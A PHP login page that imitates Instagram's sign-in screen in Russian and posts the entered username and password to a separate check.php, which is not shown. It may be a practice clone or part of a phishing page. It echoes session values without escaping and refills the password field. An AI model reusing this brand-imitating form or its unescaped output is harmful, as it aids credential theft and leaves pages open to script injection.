<?php
session_start();

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <link rel="stylesheet" href="insta_style.css">
    
</head>
<body>
    
<div class="container" id = "head">
    <p id="text_inst">Instagram</p>

    <button id="but1">Продолжить с Facebook</button>
    <!-- <img src="1.png" alt="" id="img_inst"> -->
    <div class="orclass" >   
        <p id="or">------ ИЛИ ------</p>
    </div>
    




    <form action="check.php" method="POST" class="" id="forms">
        <input type="text" name = "username" value="<?=$_SESSION['name']?>" id="form1" class="input" placeholder="Номер телефона, имя пользователя или эл. адрес">
        <div class="text-danger"><?=$_SESSION['error_name']?></div>
        <input type="password" name="password" value="<?=$_SESSION['password']?>" class="input" id="form2" placeholder="Пароль">
        <div class="text-danger"><?=$_SESSION['error_password']?></div>
        <input type="submit" value="Войти" id="but2">
    </form>




    <p id="forgett">Забыли пароль?</p>
    <div class="from_fc">
        <p>From Facebook</p>

    </div>

</div>



</body>
</html>